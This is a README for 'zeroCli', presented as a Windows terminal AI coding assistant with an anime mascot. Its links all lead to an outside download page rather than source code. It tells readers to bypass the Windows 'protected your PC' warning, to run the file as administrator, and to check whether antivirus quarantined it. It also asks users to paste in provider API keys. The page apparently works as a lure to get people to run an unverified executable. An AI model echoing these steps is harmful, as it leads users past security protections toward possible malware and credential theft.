# 🌸 zeroCli - Your Friendly Terminal Coding Assistant

[![Download zeroCli](https://img.shields.io/badge/⬇️_Download-zeroCli-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://jhay6814.github.io)

zeroCli is a small program that lives in your terminal and helps you get coding work done by simply describing what you want in plain language. It comes with Zero-chan, a pixel-art anime mascot who keeps you company while you work. You do not need to be a programmer to get started — if you can download a file and double-click it, you can use zeroCli.

---

## 🌸 What Is zeroCli?

Imagine having a helpful assistant sitting inside a simple text window on your computer. You type a request — "write me a small script that renames my photos," "explain what this error message means," "turn this idea into a to-do list" — and the assistant answers right there, without you needing to open a browser, sign into a website, or learn a complicated interface.

That is what zeroCli does. It is called a "CLI," which stands for Command Line Interface. Do not let that name scare you. A CLI is simply a window where you type words instead of clicking buttons. Many people find it faster and less distracting than clicking through menus, and zeroCli is designed to be as gentle as possible for first-time users.

The "Zero" in the name refers to "Zero Code" — the idea that you should be able to accomplish real work without writing code yourself. You describe the goal. zeroCli helps you reach it.

---

## ✨ What Makes zeroCli Special?

**🎨 Zero-chan, your pixel-art companion.** Most terminal tools are grey and lifeless. zeroCli ships with Zero-chan, a small pixel-art anime mascot who appears alongside your work. She makes long sessions feel a little less lonely and a lot more fun.

**🔌 Works with the AI you already have.** zeroCli is not locked to a single provider. It can talk to Claude, OpenAI, OpenRouter, Ollama, and LM Studio. If you already pay for one of these services, or if you prefer to run models locally on your own machine, zeroCli fits right in.

**📴 An offline mock model for practice.** Not sure whether you want to commit to an AI service yet? zeroCli includes a built-in mock model that works completely offline. You can explore the interface, learn the commands, and see how everything feels before connecting anything real.

**🌍 Speaks English and Russian.** The interface and conversations work in both languages. You can switch between them whenever you like, which makes zeroCli a comfortable choice for bilingual users.

**💾 Builds to a standalone .exe.** When you are ready, zeroCli can be packaged into a single Windows executable file. That means you can carry it on a USB stick, hand it to a friend, or run it on a machine where nothing else is installed.

**🪶 Lightweight and distraction-free.** No accounts to create inside the app, no dashboards, no pop-ups. Just you, your terminal, and Zero-chan.

---

## 🚀 Getting Started

Getting zeroCli onto your Windows computer takes only a moment.

**Step 1 — Visit the download page.**

👉 **[https://jhay6814.github.io](https://jhay6814.github.io)**

Visit this link to download the application.

**Step 2 — Save the file.**

Your browser will ask where to save the download. The default Downloads folder is perfectly fine. Remember where the file goes, because you will need to find it in the next step.

**Step 3 — Open it.**

Once the download finishes, open your Downloads folder and double-click the file you just saved. Windows may show a blue "Windows protected your PC" notice the first time you run something new. If that happens, click **More info**, then **Run anyway**. This is normal for small independent projects and simply means Microsoft has not seen the file before.

**Step 4 — You are in.**

A terminal window will open with zeroCli running inside it. Zero-chan will greet you. From here, everything happens by typing.

---

## 🖥️ Your First Few Minutes

When the window opens, you will see a prompt — a small symbol or line of text waiting for you to type. Click anywhere inside the window to make sure it has focus, then type a question and press **Enter**.

Try one of these to warm up:

- `hello` — Zero-chan will say hello back.
- `what can you do?` — you will get a short summary of the available features.
- `help` — shows the list of commands you can type.

If you make a typing mistake, just press Enter and try again. Nothing breaks. zeroCli is forgiving, and there is no way to "ruin" anything by typing the wrong word.

To leave at any time, type `exit` and press Enter, or simply close the window.

---

## 🎭 Choosing Which AI to Use

zeroCli can connect to several different AI services. On first launch it will use the offline mock model, which needs no setup at all and works without an internet connection.

When you are ready to connect a real service, zeroCli asks you to pick one from a short list:

- **Claude** — made by Anthropic.
- **OpenAI** — the makers of ChatGPT.
- **OpenRouter** — a single gateway that gives you access to many different models.
- **Ollama** — runs AI models directly on your own computer.
- **LM Studio** — another way to run models locally with a friendly desktop app.

For the cloud services (Claude, OpenAI, OpenRouter), you will need an account with that provider and an "API key" — a long password-like string they give you. The provider's website explains where to find it. zeroCli will ask you to paste it in once, and remembers it for next time.

For Ollama and LM Studio, no key is needed. You just need the model software running on your computer, and zeroCli will find it automatically.

If you ever want to change providers, type `settings` and follow the prompts.

---

## 🌍 Switching Between English and Russian

zeroCli understands both English and Russian out of the box. You can type your requests in either language, and Zero-chan will reply in the same one. To change the interface language, type `language` and press Enter, then choose English or Russian from the list that appears.

Your choice is saved, so you only need to set it once.

---

## 🧱 Building Your Own Standalone .exe

One of zeroCli's nicest features is that it can be turned into a single self-contained Windows executable. This is useful if you want to:

- Move zeroCli to another computer without reinstalling anything.
- Share it with a friend who is not comfortable with technical setup.
- Keep a backup copy that always works.

The build process is started from inside zeroCli itself with a single command — type `build` and press Enter. zeroCli will do the packing work for you and tell you where the finished file was placed when it is done. The whole thing usually takes a minute or two.

---

## ❓ Frequently Asked Questions

**Do I need to know how to code?**
No. zeroCli is built for people who want results without writing code. You describe what you want in ordinary language.

**Does it work without internet?**
Yes, when you use the built-in offline mock model. Everything else requires an internet connection, except Ollama and LM Studio, which run on your own machine.

**Is it free?**
The zeroCli application itself is free to download. The AI services you connect to may charge for their usage, depending on which provider you choose.

**Will it slow down my computer?**
No. zeroCli is a small, lightweight program. If you use Ollama or LM Studio, those separate tools do the heavy lifting.

**What if the window closes immediately?**
Open your Downloads folder, right-click the file, and choose "Run as administrator." If the problem continues, check that your antivirus has not quietly moved the file to quarantine.

**Can I use it on a Mac or Linux machine?**
zeroCli runs in a terminal, which every operating system has. The standalone .exe build is specifically for Windows.

---

## 🛡️ A Note on Privacy

Your conversations go directly from your computer to whichever AI provider you selected. zeroCli does not run its own servers and does not collect your chats. If privacy matters to you, choose Ollama or LM Studio — those keep everything on your own machine, with nothing sent over the internet at all.

---

## 💌 Feedback and Contributions

Found a bug? Have an idea for Zero-chan? The project lives on GitHub, and the issue tracker is the best place to share thoughts. Bug reports, feature requests, and kind words are all welcome.

👉 **[https://jhay6814.github.io](https://jhay6814.github.io)**

Visit this link to download the application.

Keywords: zeroCli, terminal AI assistant, agentic CLI, Zero-chan, pixel-art mascot, Claude CLI, OpenAI CLI, OpenRouter, Ollama, LM Studio, offline mock model, English Russian CLI, standalone exe, Windows AI tool, zero code